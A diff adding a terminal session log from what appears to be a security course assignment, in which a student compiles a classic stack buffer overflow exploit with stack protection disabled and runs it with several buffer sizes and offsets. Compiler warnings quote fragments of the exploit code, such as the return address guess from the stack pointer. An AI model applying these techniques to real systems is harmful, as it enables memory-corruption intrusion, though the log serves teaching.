@@ -1,0 +1,37 @@
+Script started on Fri 06 Apr 2018 09:43:20 PM EDT
+root@js-157-88:/class/assignment/Submitted# exitgcc -fno-stack-protector -z execstack part4.c part4-part4opart4 part4[C[C[C[C[C
+part4.c: In function ‘main’:
+part4.c:20:7: warning: incompatible implicit declaration of built-in function ‘exit’ [enabled by default]
+       exit(0);
+       ^
+part4.c:24:14: warning: incompatible implicit declaration of built-in function ‘malloc’ [enabled by default]
+       buff = malloc(bsize);
+              ^
+part4.c:26:12: warning: assignment makes pointer from integer without a cast [enabled by default]
+       addr = get_sp() -offset;
+            ^
+part4.c:27:7: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘long long int *’ [-Wformat=]
+       printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr); 
+       ^
+part4.c:33:18: warning: assignment makes integer from pointer without a cast [enabled by default]
+       *(addr_ptr)=addr;
+                  ^
+part4.c:38:23: warning: assignment makes integer from pointer without a cast [enabled by default]
+       buff[bsize - 1] = (char*)NULL; 
+                       ^
+root@js-157-88:/class/assignment/Submitted# ./part4
+
+
+Usage is either attack [buffer_size]
+ or attack [buffer_size] [stack_offset]
+root@js-157-88:/class/assignment/Submitted# ./part4 1024 12000
+140737488347872
+Using address as guess for beginning of attack buffer: 0xffffb400
+root@js-157-88:/class/assignment/Submitted# ./part4 1024 12000[1P 12000[1P 120005 120006 12000
+140737488347872
+Using address as guess for beginning of attack buffer: 0xffffb400
+root@js-157-88:/class/assignment/Submitted# ./part4 1056 120000
+140737488347872
+Using address as guess for beginning of attack buffer: 0xfffe0e20
+root@js-157-88:/class/assignment/Submitted# exit
+Script done on Fri 06 Apr 2018 09:43:59 PM EDT
